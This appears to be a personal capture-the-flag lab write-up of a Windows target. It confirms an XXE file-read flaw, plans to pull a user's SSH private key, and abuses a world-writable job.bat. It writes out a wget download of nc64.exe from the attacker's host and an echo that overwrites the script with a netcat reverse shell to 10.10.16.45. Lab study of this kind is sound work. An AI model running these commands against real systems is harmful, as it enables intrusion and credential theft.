The output of the `win.ini` file on the target itself is displayed in our response message, which proves that the ==XML External Entity== vulnerability is present.

This may hint to a username

Since we can already navigate the files present on the target system using the XXE vulnerability, let's attempt to navigate to the daniel user's .ssh folder in order to attempt to retrieve their private key.

Wevtutil.exe is an administrator command line utility used primarily to register your event provider on the computer.

Check for mismatched permissions between script and usergroup or file configuration

==`icacls job.bat`==
![[Pasted image 20240528162346.png]]


Looking at the permissions of job.bat using icacls reveals that the group `BUILTIN\Users` has full control (F) over the file. The `BUILTIN\Users` group represents all local users, which includes Daniel as well. We might be able to get a shell by transferring netcat to the system and modifying the script to execute a reverse shell.





Before then, we need to check if the wevtutil process mentioned in the job.bat file is running. We can see the currently scheduled tasks by typing the ==`schtasks`== command. 

If our permission level doesn't allow us to view this list through Windows' command line, we can quickly use Powershell's ps command instead, which represents another security misconfiguration that works against the server.

`schtasks`

`powershell`

![[Pasted image 20240528162711.png]]

We can see that the process wevtutil is running, which is the same process listed in the job.bat file. This indicates that the .bat script might be executing.

Because the target host does not have access to the Internet, we will need to deliver the nc64.exe executable through our own connection with the target. 

In order to do so, we will first need to download nc64.exe on our system, start up a Python HTTP server on one of our ports, then switch to the shell we have on the host to issue a wget command with our address and the nc64.exe file residing on our server. 

This will initialize a download from the host to our Python server for the executable. Make sure you don't switch folders after downloading the executable. 

The Python HTTP server needs to be running in the same directory as the location of the downloaded nc64.exe file we want to deliver to the target.


==`wget https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe`==

Serve and deliver to windows machine

==`wget http://10.10.16.45:8000/nc64.exe -outfile nc64.exe`==

Since we have full control over the job.bat script, we will modify its' contents

==`echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.16.45 1337 > C:\Log-Management\job.bat`==


Start Listener and wait for the task to run
